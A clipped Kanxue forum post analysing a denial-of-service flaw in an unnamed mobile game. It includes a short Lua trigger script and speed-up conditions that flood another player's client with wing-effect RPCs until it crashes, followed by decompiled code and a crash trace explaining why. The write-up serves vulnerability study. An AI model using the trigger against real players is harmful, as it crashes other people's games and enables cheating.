---
title: 【看雪】某手游客户端 RPC 洪泛拒绝服务漏洞分析
source: https://bbs.kanxue.com/thread-293516.htm
source_host: bbs.kanxue.com
clip_date: 2026-11-16T08:36:14+08:00
trace_id: b071ba76-7982-4b6a-a7e1-a9b5d5de7001
content_hash: 1ecc8a5722ebc58bc44f0ddaea9a4fb4b17d43d5ebf203c5f2301368170925ca
status: synced
tags:
  - 看雪
series: null
feed_source: 看雪·Android安全
ai_summary: "**核心：** 某手游因 RPC 无频率/参数校验，攻击者用 Lua 快速触发 stuffType=8 特效洪水，导致受害者客户端特效对象池耗尽后空指针崩溃。"
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 41a75244-d011-81f2-a927-e2e34aca6de0
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> **核心：** 某手游因 RPC 无频率/参数校验，攻击者用 Lua 快速触发 stuffType=8 特效洪水，导致受害者客户端特效对象池耗尽后空指针崩溃。
> 
> - **触发条件：** Lua 循环添加 `PlayPurchaseFX` 事件且 stuffType 设为 8（光翼），一秒内发送数百条即可；仅 8 会崩溃，0-7/9 正常。
> - **崩溃点：** 池满时 `WingBuffBarn::CreateWingBuffVisual` 返回 null，未校验直接传入 `WingBuffVisual::Initialize`，读取 `fx->flags`（偏移 0x10）触发 SIGSEGV（libBootloader.so 偏移 0x302869c）。
> - **传播链路：** 子事件 broadcastEnabled 默认为 true，`PurchaseFx::Update` 把 stuffType 打包成 `PurchaseFxRpc` 经服务端转发；接收端 `PurchaseFxRpc::Run` 只验证发送者身份和可见角色，不校验频率与 stuffType。
> - **耗时机制：** 特效对象约 3.8 秒（elapsed/4.0 > 0.95）后才释放，接收端无加速时钟，同时占用对象数远超池容量——实测仅约 1.12 秒即资源耗尽（日志 588 条记录）。
> - **加速悖论：** 加速 k 倍让攻击者自身 deltaTime 同步放大，池占用仍为 3.8·R 不变，而受害者保持正常时钟，占用为 k 倍，故攻击者不崩溃、受害者崩溃。

## 漏洞信息

该漏洞属于 `Resource-Exhaustion DoS via Unbounded RPC Flood`

### 影响版本

游戏版本: 0.16.7.421589  
资源版本: 75506 ~ 75885

## 起因

在B站看到一个外挂的视频，介绍了一种方法可以使同房间内的玩家游戏崩溃，经初步观察得出如下触发条件

1.  游戏开启加速
2.  短时间内大量执行如下lua脚本(游戏自带一个lua引擎)， `stuffType->8` 对应游戏内的光翼，一组执行100次

```lua
local e = game:eventBarn():AddEventByMetaName("PlayPurchaseFX")
e:stuffType(8)
e:invisibleItem(false)
e:autoStart(true)
e:Start()
```

## 崩溃点分析

经过长达半小时的分析和手搓之后，复现得到了同样的崩溃结果，顺带测试了一下 `stuffType` 设为0-9，只有 8 会导致崩溃

logcat日志里还会出现大量的 `[W] Invalid PurchaseFxItem3D configuration`

既然有崩溃那么自然会产生崩溃文件转储，保存在 `/data/user/0/com.xxxxxx.sky/files/uniTrace/crashhunter/` 目录下，可以提取出来分析

杂活交给大肥鱼去干，过了 1 分钟就得到了崩溃点

```python
pid 23657 / tid 23959 ("MainThread")
SIGSEGV  si_code=1  SEGV_MAPERR  fault addr = 0x10
pc = 0x7dd2a3c69c  → 模块内偏移 0x302869c (libBootloader.so)

0x302869c:  ldrb w8, [x19, #0x10]      ; x19 = 0
```

IDA分析一下，对应函数是 `WingBuffVisual::Initialize` ，在调用 `fx->flags` 的时候用于空指针导致了异常，前面也没有对空指针进行校验

```c
void __fastcall WingBuffVisual::Initialize(WingBuffVisual *fx, Game *game, const float *position)
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]

  if ( (WORD5(xmmword_4D265D4) & 0xA080) != 0
    || (v18 = game, handled = xxx_dispatch(argument0: fx).handled, game = v18, handled == 0) )
  {
    if ( (fx->flags & 1) == 0 )
    {
      // ...
    }
  }
}
```

找交叉引用回到上层 `PurchaseFx::Initialize` ，大致重要的代码如下，顺带解释了前面日志里大量的 `Invalid PurchaseFxItem3D configuration` 字符串来源，只要 `stuffType` 不为1那么就会有这条日志，看起来和崩溃没有直接关系

`stuffType` 0~7走的都是同一个模型改改颜色和大小，9是换了个模型，只有8是特殊的。注意到在调用 `WingBuffVisual::Initialize` 初始化前，会先调用一个工厂函数 `WingBuffBarn::CreateWingBuffVisual`

```c
unsigned __int64 __fastcall PurchaseFx::Initialize(PurchaseFx *fx, Game *game, void *staticHeap)
{
  // ...
  for ( k = 0; k < fx->itemCount; ++k )
  {
    item = &fx->items[k];
    if ( item->stuffType != 1 )
    {
      sub_2219518(a1: 0x4DA1CCD4);
      LogStream_Construct(&stream, category: &byte_5738FB, priority: 2u, file: &byte_5738FB, line: 0x16Du);
      sub_22194DC(a1: &stream, s: "Invalid PurchaseFxItem3D configuration");
      LogStream_Destroy(&stream);
      item->value = 0;
    }
    createLensFlare = 1;
    createWingBuffFx = 0;
    modelType = 6;
    stuffType = item->stuffType;
    switch ( stuffType )
    {
      case 1:
        switch...
        break;
      case 2:
        modelType = 3;
        LODWORD(v9) = 1036831949;
        v9 = sub_1B29D74(a1: 1, result: v9, a3: 0.1f, a4: 0.5, a5: 1.0);
        v64 = v9;
        v12 = item;
        *item->color = *&v9;
        *&v12->color[2] = *(&v64 + 1);
        item->scale = 0.6f;
        break;
      case 3:
        modelType = 3;
        LODWORD(v9) = 0.75;
        v9 = sub_1B29D74(a1: 1, result: v9, a3: 0.0, a4: 0.0, a5: 1.0);
        v62 = v9;
        v14 = item;
        *item->color = *&v9;
        *&v14->color[2] = *(&v62 + 1);
        item->scale = 0.6f;
        break;
      case 4:
        modelType = 3;
        *item->color = xmmword_4D28900;
        item->scale = 0.6f;
        break;
      case 5:
        modelType = 3;
        LODWORD(v9) = 0.75;
        v9 = sub_1B29D74(a1: 1, result: v9, a3: 0.0, a4: 0.0, a5: 1.0);
        v63 = v9;
        v13 = item;
        *item->color = *&v9;
        *&v13->color[2] = *(&v63 + 1);
        item->scale = 0.25;
        break;
      case 6:
        modelType = 3;
        LODWORD(v9) = 0.75;
        v9 = sub_1B29D74(a1: 1, result: v9, a3: 0.25, a4: 0.0, a5: 1.0);
        v61 = v9;
        v15 = item;
        *item->color = *&v9;
        *&v15->color[2] = *(&v61 + 1);
        item->scale = 0.6f;
        break;
      case 7:
        modelType = 3;
        LODWORD(v9) = 0.75;
        v9 = sub_1B29D74(a1: 1, result: v9, a3: 0.75, a4: 0.75, a5: 1.0);
        v60 = v9;
        v16 = item;
        *item->color = *&v9;
        *&v16->color[2] = *(&v60 + 1);
        item->scale = 0.6f;
        break;
      case 8:
        createLensFlare = 0;
        createWingBuffFx = 1;
        break;
      case 9:
        modelType = 5;
        break;
      default:
        v111 = 10;
        continue;
    }
    if ( modelType != 6 ) ...
    if ( (createLensFlare & 1) != 0 && sub_2219628(a1: p_game->lensFlareBarn) < 0x280 ) ...
    if ( (createWingBuffFx & 1) != 0 )
    {
      allocatedWingFx = WingBuffBarn::CreateWingBuffVisual(barn: p_game->wingBuffBarn);
      item->wingBuffFx = allocatedWingFx;
      wingBuffFx = item->wingBuffFx;
      v35 = p_game;
      LODWORD(v36) = 0;
      sub_1B29D38(a1: &position, result: v36, a3: 100.0, a4: 0.0);
      WingBuffVisual::Initialize(fx: wingBuffFx, game: v35, &position);
    }
    v111 = 0;
  }
  // ...
}
```

跟进分析一下，可以发现当 `purchaseFxPool` 内的对象数量大于容量后，函数就会返回空，而在调用 `WingBuffVisual::Initialize` 前也没有校验过，最终就会触发空指针异常崩溃

```c
void *__fastcall WingBuffBarn::CreateWingBuffVisual(WingBuffBarn *barn)
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]

  if ( (WORD2(xmmword_4D265E4) & 0x40A) != 0
    || (v3 = xxx_dispatch(argument0: barn), v3.handled == 0) )
  {
    if ( barn->purchaseFxPool.count >= barn->purchaseFxPool.capacity
      || (v3.value = WingBuffPurchaseFxPool_Allocate(pool: &barn->purchaseFxPool, indexOut: nullptr), v3.value == 0) )
    {
      // ...
      v3.value = 0;
    }
  }
  return v3.value;
}
```

到这一步，受害者客户端里的崩溃链路就完整了。那么这些事件是怎么从攻击者那边跑到受害者那边去的呢

## RPC 广播

回到 `PlayPurchaseFX` 。 `PlayPurchaseFX::OnStart` 会创建一个子事件

```c
void __fastcall PlayPurchaseFX::OnStart(PlayPurchaseFX *event, Game *game)
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]

  sourceEvent = event;
  p_game = game;
  v2 = event;
  if ( (word_4D265FC & 0xE00) != 0
    || ((v9 = xxx_dispatch(argument0: event), v9.handled == 0)
      ? (v7 = 0)
      : (v8 = v9, sub_221932C(a1: v9.value, a2: v9.handled), v7 = 1),
        v7 == 0) )
  {
    childFx = EventBarn_CreatePurchaseFx(barn: p_game->eventBarn, maximum: -1);
    LocalAvatar = AvatarBarn_TryGetLocalAvatar(avatars: p_game->avatarBarn, requireActiveCarrier: 1u);
    id = sub_2219370(a1: LocalAvatar);
    childFx->playerId = id;
    PurchaseFxItem_Construct(&item);
    item.stuffType = 2;
    if ( v2->unknown_026[1] != 0 )
      item.stuffType = v2->unknown_026[1];
    if ( (v2->unknown_026[0] & 1) != 0 )
      item.stuffType = 0;
    PurchaseFx_AppendItem(fx: childFx, &item);
    Event::Start(event: childFx, diagnosticCarrier: 0x99u);
    Event::Stop(event: v2, diagnosticCarrier: 0x9Bu);
  }
}
```

一次脚本调用就是一个子事件、一个 `stuffType=8` 的 item。子事件创建出来时 broadcastEnabled 默认是 true。PurchaseFx 的构造函数 sub_221B504 里可以确认

```c
long double __fastcall sub_221B504(PurchaseFx *fx)
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]

  sub_1B5AD80(a1: fx);
  fx->vtable = off_36FBD50;
  v2 = *(sub_2214160() + 56);
  *fx->unknown_0B0 = 0;
  fx->classId = v2;
  v3 = dword_4C0AD30;
  fx->vtable = off_36FB870;
  *&fx->skuStringStorage[16] = 0u;
  fx->outfitCount = 0;
  fx->playerId = v3;
  fx->flag193 = 1;
  fx->flag194 = 1;
  fx->flag195 = 1;
  fx->broadcastEnabled = 1;
  // ...
}
```

在 `PurchaseFx::Update` 里有一段RPC发送逻辑

```c
if ( fx->broadcastEnabled && (fx->stateFlags & 2) == 0 )
{
  if ( (v323 & 1) != 0 )
  {
    v310 = dword_4C0AD30;
    if ( sub_2219468(a1: &fx->playerId, a2: dword_4C0AD30) )
    {
      PurchaseFxRpc_Construct(rpc: &pfxRpc);
      pfxRpc.playerId = fx->playerId;
      pfxRpc.stuffType = fx->stuffType;
      v25 = sub_22194B8(a1: fx->skuStringStorage);
      if ( strlen(s: v25) < 0x10 )
      {
        v26 = sub_22194B8(a1: fx->skuStringStorage);
        strcpy(dest: pfxRpc.sku, src: v26);
      }
      pfxRpc.itemCount = fx->itemCount;
      for ( i = 0; i < fx->itemCount; ++i )
      {
        pfxRpc.items[i][0] = fx->items[i].stuffType;
        pfxRpc.items[i][1] = fx->items[i].value;
      }
      v330 = 3;
      PurchaseFx_QueueRpc(client: *&p_game->netModule->gap_0x0[56], rpc: &pfxRpc);
      sub_10D626C();
    }
  }
  fx->stateFlags = fx->stateFlags & 0xFD | 2;
}
```

`PurchaseFxRpc::Run` 是接收端对应的处理函数，只校验了发送者身份和有没有可见角色，没校验频率，也没校验报文里的 stuffType

```c
void __fastcall PurchaseFxRpc::Run(const PurchaseFxRpc *rpc, Game *game)
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]

  receivedRpc = rpc;
  p_game = game;
  p_rpc = rpc;
  if ( (WORD5(xmmword_4D265C4) & 0x2440) != 0
    || ((v11 = xxx_dispatch(argument0: rpc), v11.handled == 0)
      ? (v9 = 0)
      : (v10 = v11, sub_221932C(a1: v11.value, a2: v11.handled), v9 = 1),
        v9 == 0) )
  {
    if ( NetRpc::IsSourceValid(game: p_game, delivery: p_rpc->delivery, expectedPlayerId: &p_rpc->playerId) )
    {
      avatarBarn = p_game->avatarBarn;
      playerId = p_rpc->playerId;
      sourceAvatar = AvatarBarn::GetAvatarByPlayerId(avatarPool: avatarBarn, playerIdCarrier: playerId, allowType5: 0);
      if ( sourceAvatar != nullptr && (sub_22193CC(a1: sourceAvatar) & 1) == 0 )
      {
        if ( Avatar_HasDisplayableRole(avatar: sourceAvatar) )
        {
          event = EventBarn_CreatePurchaseFx(barn: p_game->eventBarn, maximum: -1);
          event->playerId = p_rpc->playerId;
          event->stuffType = p_rpc->stuffType;
          sub_12DB8B4(a1: event + 38, s: p_rpc->sku);
          for ( i = 0; i < p_rpc->itemCount; ++i )
          {
            PurchaseFxItem_Construct(&item);
            item.stuffType = p_rpc->items[i][0];
            item.value = p_rpc->items[i][1];
            PurchaseFx_AppendItem(fx: event, &item);
          }
          v9 = 2;
          Event::Start(event, diagnosticCarrier: 0xFAu);
          v9 = 0;
        }
        else
        {
          v9 = 1;
        }
      }
      else
      {
        v9 = 1;
      }
    }
  }
}
```

所以大致是这么一个链路

```python
攻击者                         服务端                      受害者
Lua 循环 PlayPurchaseFX
  → 子事件（stuffType=8）
  → 本地占一个池对象
  → 发 PurchaseFxRpc   ────→  转发   ────→  PurchaseFxRpc::Execute
                                              → 新事件（stuffType=8）
                                              → 占一个池对象
                                              → 池满
                                              → WingBuffVisual::Initialize(nullptr)
                                              → 崩溃
```

那么 `purchaseFxPool` 为什么会满而不会自己清理呢

回到 `PurchaseFx::Update` 里，fx->elapsed 是每帧累加事件的存活时间， `PurchaseFx` 的整个生命周期都靠它驱动

```c
fx->elapsed = fx->elapsed + deltaTime;
```

把 `j = 0` 带入计算(该特效只会有一个item)， 第 0 个item的 release 条件是 `elapsed / 4.0 > 0.95` ，意味着至少要到 3.8 秒才会释放

```c
float __fastcall clamp01(float *a1)
{
  return fminf(fmaxf(*a1, 0.0), 1.0);
}
float __fastcall lerp(float *a1, float *a2, float a3)
{
  return *a1 + ((*a2 - *a1) * a3);
}
void __fastcall PurchaseFx::Update(PurchaseFx *fx, Game *game)
{
  // ...
  for ( j = 0; j < fx->itemCount; ++j )
  {
    item = &fx->items[j];
    v290[fx->items[j].value] = 1;
    *&a2 = 0u;
    sub_22192DC(&a1, &a2);
    v273 = j / fx->itemCount;
    v271 = (fx->elapsed / 4.0) - (v273 * 0.3f);
    progress = clamp01(a1: &v271);
    if ( j != 0 ) // 光翼的动画只有一个item，所以这里的分支走else，实际上实在计算光效位置，可以忽略
    {
      v260 = (progress + -0.9f) / 0.1f;
      v261 = 0.2f - (clamp01(a1: &v260) * 0.2f);
      x = (fx->elapsed * 3.0) + (v273 * 57.0);
      v257 = 2.5;
      v256 = 0.25;
      v258 = lerp(a1: &v257, a2: &v256, a3: progress);
      sincosf(x, &sinx, &cosx); // 多个item时动画效果是绕圈下落的
      *&v53 = cosx * v261;
      sub_1B29D38(a1: v253.n128_u64, result: v53, a3: v258, a4: sinx * v261);
      v54 = sub_2219E18(a1: &v288, a2: &v253);
      LODWORD(v255) = v54.n128_u32[2];
      v254 = v54.n128_u64[0];
      a1 = __PAIR128__(v255, v54.n128_u64[0]);
    }
    else
    {
      v269 = (progress + -0.6f) / 0.2f;
      v270 = clamp01(a1: &v269);
      v267 = 2.5;
      v266 = 0;
      v268 = lerp(a1: &v267, a2: &v266, a3: progress);
      *&v50 = 0;
      sub_1B29D38(a1: v264.n128_u64, result: v50, a3: v268, a4: 0.0);
      v51 = sub_2219E18(a1: &v288, a2: &v264);
      v265.n128_u32[2] = v51.n128_u32[2];
      v265.n128_u64[0] = v51.n128_u64[0];
      v52 = sub_2219ED4(a1: &v265, a2: &v287, a3: v270);
      LODWORD(v263) = v52.n128_u32[2];
      v262 = v52.n128_u64[0];
      a1 = __PAIR128__(v263, v52.n128_u64[0]);
    }
    v252 = ((sinf(x: (v324 * 10.0) + (v273 * 17.3f)) * 0.5) + 0.5) * 0.85f;
    v55 = sinf(x: (v324 * 27.0) + (v273 * 35.7f));
    v252 = v252 + (((v55 * 0.5) + 0.5) * 0.15f);
    if ( item->model != nullptr ) ...
    if ( item->lensFlare != nullptr ) ...
    if ( item->wingBuffFx != nullptr ) ...
    if ( j == 0 && progress > 0.85f )
      v291 = true;
    if ( progress > 0.95f )
    {
      v230 = 0;
      if ( item->model != nullptr ) ...
      if ( item->lensFlare != nullptr ) ...
      if ( item->wingBuffFx != nullptr )
      {
        WingBuffBarn::ReleaseWingBuffVisual(barn: p_game->wingBuffBarn, fx: item->wingBuffFx, game: p_game);
        item->wingBuffFx = nullptr;
        if ( (v326 & 1) != 0 && sourceAvatar != nullptr && (sub_2219FC0(a1: sourceAvatar->account) & 1) != 0 ) ...
        v230 = 1;
      }
      if ( (v230 & 1) != 0 ) ...
    }
  }
  // ...
}
```

所以我们可以推测一下，既然接收端是没有限速的，那么攻击者只要在 `3.8s` 这个窗口内尽可能多的发送RPC即可。回到崩溃日志，查看 `Invalid PurchaseFxItem3D configuration` 数量按时间分一下组，数据刚好对上，只花了大概 1.12 秒就资源耗尽了

```python
xx:xx:xx.049-054   100 条
xx:xx:xx.417-423   100 条
xx:xx:xx.557-564   100 条
xx:xx:xx.694-697   100 条
xx:xx:xx.893-897   100 条
xx:xx:xx.162-166    88 条
```

同时我们还注意到，攻击者在执行有效的攻击后自己本身并不会崩溃，这里推测是因为加速挂把游戏时钟也一起加快了。下面是AI分析的小结论

假设加速 k 倍，不开加速时每秒产生 R 条

-   攻击者这边：每秒产生 `k·R` 条；同时 `deltaTime` 也被放大， `elapsed` 走得快 `k` 倍， `3.8` 秒的归还窗口在真实时间里被压成 `3.8 / k` 秒。所以池子里同时占着的对象数是 `k·R × 3.8/k = 3.8·R` ，和不开加速时一样。
-   受害者这边：每秒收到 `k·R` 条，但游戏时钟是正常的，归还窗口还是 `3.8` 秒。同时占着的对象数是 `k·R × 3.8` ，是攻击者的 `k` 倍。

最后账号喜得一份十年大礼包

[#逆向分析](https://bbs.kanxue.com/forum-161-1-118.htm) [#协议分析](https://bbs.kanxue.com/forum-161-1-120.htm) [#漏洞相关](https://bbs.kanxue.com/forum-161-1-123.htm)
